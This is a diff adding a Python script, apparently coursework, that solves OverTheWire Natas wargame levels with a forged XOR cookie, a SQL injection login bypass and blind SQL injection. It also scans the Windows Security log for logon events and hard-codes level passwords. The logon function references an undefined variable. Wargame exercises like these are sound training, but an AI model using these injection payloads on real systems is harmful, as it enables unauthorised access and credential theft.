@@ -1,0 +1,111 @@
+import re, base64, requests, Evtx.Evtx as evtx, xml.etree.ElementTree as ET
+
+def natas11(password):
+    url = f'http://natas11:{password}@natas11.natas.labs.overthewire.org/'
+    resp = requests.get(url)
+    cookie_dict = resp.cookies.get_dict()
+    cookie_data_b64 = cookie_dict.get("data")
+    cookie_data_b64 = cookie_data_b64[:-3]
+    cookie_data_b64 += "="*(4 -(len(cookie_data_b64) % 4))
+    cookie_data = base64.b64decode(cookie_data_b64)
+    orig_json = '{"showpassword":"no","bgcolor":"#ffffff"}'
+    long_key = xorcrypt(cookie_data.decode("ascii"), orig_json)
+    curr_key = long_key[0]
+    for num in range(1, len(long_key)):
+        curr_key += long_key[num]
+        test_key = long_key[num+1: ((num+1) + len(curr_key))]
+        if curr_key == test_key:
+            break
+    json_str = '{"showpassword":"yes","bgcolor":"#ffffff"}'
+    cookie = dict(data=base64.b64encode(xorcrypt(json_str, curr_key).encode("ascii")))
+    data = cookie.get("data")
+    data = data.decode("ascii")
+    cookie.update({"data": data})
+    resp = requests.get(url, cookies=cookie)
+    regex_str = "The password for natas\d+ is (\w{32})"
+    passwd = re.findall(regex_str, resp.text)
+    print("The Password for level 11 is : {}".format(passwd[0]))
+    return
+
+def natas14(password):
+    url = f'http://natas14:{password}@natas14.natas.labs.overthewire.org/'  
+    username  = "natas15"
+    password = '" or "1"="1'
+    resp = requests.post(url, data={"username": username, "password": password})
+    regex_str = "The password for natas\d+ is (\w{32})"
+    passwd = re.findall(regex_str, resp.text)
+    print("The Password for level 14 is : {}".format(passwd[0]))
+    return passwd[0]
+
+def natas15(password):
+    passwd = ""
+    final_list = ""
+    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    url = f'http://natas15:{password}@natas15.natas.labs.overthewire.org/'
+    for char in alphabet:
+        data = {'username' : 'natas16" and password LIKE BINARY "%{}%" #'.format(char)}
+        resp = requests.post(url, data=data)
+        if 'exists' in resp.text:
+            final_list += char
+    for num in range(32):
+        for char in final_list:
+            data = {'username' : 'natas16" and password LIKE BINARY "{}{}%" #'.format(passwd, char)}
+            resp = requests.post(url, data=data)
+            if 'exists' in resp.text:
+                passwd += char
+                break
+    print("The Password for level 14 is : {}".format(passwd))
+    return
+
+def xorcrypt(plain,key):
+    c = ""
+    #Loop to perform xor on each character of plaintext
+    for i in range(len(plain)):
+        #Get current iteration character of plaintext
+        c1 = plain[i]
+        #Get current iteration character of key
+        c2 = key[i%len(key)]
+        #XOR unicode verion of plaintext to int (ord) and return string representation (chr)
+        c += chr(ord(c1) ^ ord(c2))
+    return c
+
+def check_logons(path):
+    net_logon = '4624</EventID>'
+    user_regex = '"TargetUserName">\w+<'
+    addr_regex = '"SourceNetworkAddress">\w+<'
+    with evtx.Evtx(path) as log:
+        for r in log.records():
+            username = ""
+            address = ""
+            xml_data = r.xml()
+            if net_logon in xml_data:
+                try:
+                    test = re.search(user_regex, str(xml_data))
+                    test = test[0][:-1]
+                    test2 = test.split(">")
+                    username = test2[1]
+                except:
+                    pass
+                try:    
+                    test = re.search(addr_regex, str(xml_data))
+                    test = test[0][:-1]
+                    test2 = test.split(">")
+                    address = test2[1]
+                except:
+                    pass
+                if username != "" and address != "":
+                    print("Logon Detected, Username: {}         Address: {}".format(username, address))
+                print(cnt)
+    return
+
+
+pass_lvl10 = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
+pass_lvl13 = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
+print("\nQuestion 1\n")
+natas11(pass_lvl10)
+pass_lvl14 = natas14(pass_lvl13)
+#natas15(pass_lvl14)
+print("\nQuestion 2\n")
+log_path = 'C:\\Windows\\Sysnative\\winevt\\Logs\\Security.evtx'
+print("\nSearching for Windows Logon Events\n")
+check_logons(log_path)
